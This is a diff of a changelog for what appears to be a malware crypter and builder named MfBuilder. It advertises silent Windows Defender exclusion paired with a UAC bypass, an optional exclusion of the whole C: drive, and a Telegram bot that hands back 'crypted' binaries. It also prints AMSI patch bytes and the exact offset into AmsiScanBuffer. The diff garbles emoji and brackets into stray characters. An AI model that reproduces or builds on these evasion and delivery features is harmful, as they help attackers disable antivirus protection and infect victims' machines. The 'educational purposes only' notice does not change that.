@@ -1,15 +1,15 @@
 # Changelog
 
-## [Unreleased] - 2025-11-03
+## [Unreleased• - 2025-11-03
 
-### Added - Windows Defender Exclusion (?? NEW!)
+### Added - Windows Defender Exclusion ( NEW!)
 
-#### ??? Silent Windows Defender Evasion
+#### • Silent Windows Defender Evasion
 - **Defender Exclusion Module**: Automatically adds executable to Windows Defender exclusions
 - **Silent Mode**: When combined with UAC bypass, adds exclusions completely silently!
 - **No User Interaction**: No prompts, no windows, completely transparent
 - **Dual Exclusions**: Adds both path and process exclusions
-- **C:\ Drive Exclusion**: Optional aggressive mode excludes entire C: drive (?? extremely aggressive, testing only)
+- **C:\ Drive Exclusion**: Optional aggressive mode excludes entire C: drive ( extremely aggressive, testing only)
 - **Configurable Levels**: Standard (recommended) or Aggressive (maximum evasion)
 - **Graceful Failure**: Silently continues if exclusion fails (no crashes)
 
@@ -23,8 +23,8 @@
 **Configuration:**
 - CLI: Set `"defender_exclusion": true` and optionally `"defender_exclude_drive": true` in build.json
 - Bot: Toggle option #7 (Defender) and #8 (C:\ Drive) in configuration menu
-- Bot shows "?? (Silent with UAC!)" when UAC + Defender enabled
-- Bot shows "?? AGGRESSIVE!" when C:\ drive exclusion enabled
+- Bot shows " (Silent with UAC!)" when UAC + Defender enabled
+- Bot shows " AGGRESSIVE!" when C:\ drive exclusion enabled
 
 **Files added:**
 - `MfRunner/Utilities/DefenderExclusion.cs` - Main implementation with optional C:\ drive exclusion
@@ -33,7 +33,7 @@
 
 ### Added - Telegram Bot Interface
 
-#### ?? Full Telegram Bot Implementation
+####  Full Telegram Bot Implementation
 - **Authentication System**: Secure key-based authentication before allowing access
 - **Interactive Workflow**: 
   - Step 1: User authenticates with key
@@ -68,7 +68,7 @@
   - Temporary file management with auto-cleanup
   - Send crypted binary back to user
 
-#### ?? New Files
+####  New Files
 - `src/telegram_bot.rs` - Complete Telegram bot implementation (481 lines)
 - `.env.example` - Template for bot token configuration
 - `BOT_SETUP.md` - Comprehensive bot setup guide
@@ -77,7 +77,7 @@
 
 ### Changed - Enhanced AMSI Bypass (.NET Only!)
 
-#### ??? AMSI Bypass Improvements in `MfRunner/Patches/PatchAMSI.cs`
+#### • AMSI Bypass Improvements in `MfRunner/Patches/PatchAMSI.cs`
 
 **Important Note**: AMSI and ETW patches are **ONLY applied for .NET payloads**. Native payloads use indirect syscalls and don't need these patches. This is now clearly documented in the code.
 
@@ -88,20 +88,20 @@
 
 **Before:**
 ```csharp
-byte[] AmsiPatchBytes = new byte[] { 144, 144, 144, 144, 144, 144, 144, 144, 49, 192, 195 }; // 11 bytes
+byte• AmsiPatchBytes = new byte• { 144, 144, 144, 144, 144, 144, 144, 144, 49, 192, 195 }; // 11 bytes
 // Patched at function start
 ```
 
 **After:**
 ```csharp
-byte[] AmsiPatchBytes = new byte[] { 72, 49, 219 }; // 3 bytes (xor rbx, rbx)
+byte• AmsiPatchBytes = new byte• { 72, 49, 219 }; // 3 bytes (xor rbx, rbx)
 IntPtr targetAddress = (IntPtr)((long)AmsiScanBufferAddress + 33); // Offset +33
 // Proper memory protection restoration
 ```
 
 ### Modified - Architecture Refactoring
 
-#### ??? Code Structure Changes in `src/main.rs`
+#### • Code Structure Changes in `src/main.rs`
 - **Dual Mode Support**: Single binary supports both CLI and bot modes
   - CLI mode: `./MfBuilder` (uses build.json)
   - Bot mode: `./MfBuilder --bot` (interactive Telegram)
@@ -110,7 +110,7 @@ IntPtr targetAddress = (IntPtr)((long)AmsiScanBufferAddress + 33); // Offset +33
 - **Type Exports**: Made `SupportedFileExtension` and `MfBuilder` public
 - **Async Runtime**: Added Tokio runtime for async Telegram bot operations
 
-#### ?? Dependencies in `Cargo.toml`
+####  Dependencies in `Cargo.toml`
 Added Telegram bot dependencies:
 - `tokio` v1.42.0 with full features (async runtime)
 - `teloxide` v0.13 with macros (Telegram bot framework)
@@ -120,7 +120,7 @@ Added Telegram bot dependencies:
 
 ### Documentation
 
-#### ?? New Documentation
+####  New Documentation
 - **README.md**: Completely rewritten with:
   - New features section
   - Usage modes (bot vs CLI)
@@ -146,7 +146,7 @@ Added Telegram bot dependencies:
 
 ### Technical Details
 
-#### ?? Implementation Highlights
+####  Implementation Highlights
 
 **Telegram Bot Architecture:**
 - Session-based state management using `Arc<Mutex<HashMap>>`
@@ -163,7 +163,7 @@ Added Telegram bot dependencies:
 
 **User Experience:**
 - Real-time configuration menu updates
-- Clear emoji indicators (? ON / ? OFF)
+- Clear emoji indicators (• ON / • OFF)
 - Step-by-step guided workflow
 - Inline help and error messages
 - Progress updates during build
@@ -185,17 +185,17 @@ No changes required for CLI usage. The tool works exactly as before when run wit
 ### Future Enhancements
 
 Potential improvements for consideration:
-- [ ] Multi-user authentication with per-user keys
-- [ ] Rate limiting to prevent abuse
-- [ ] Build queue for handling multiple concurrent requests
-- [ ] Statistics and logging dashboard
-- [ ] Support for binding additional files via bot
-- [ ] Custom output filename selection
-- [ ] Build history and retrieval
+- [ • Multi-user authentication with per-user keys
+- [ • Rate limiting to prevent abuse
+- [ • Build queue for handling multiple concurrent requests
+- [ • Statistics and logging dashboard
+- [ • Support for binding additional files via bot
+- [ • Custom output filename selection
+- [ • Build history and retrieval
 
 ### Security Notice
 
-?? **Important**: This tool is for educational and authorized testing purposes only.
+ **Important**: This tool is for educational and authorized testing purposes only.
 
 New security considerations with bot:
 - Keep `TELOXIDE_TOKEN` secret
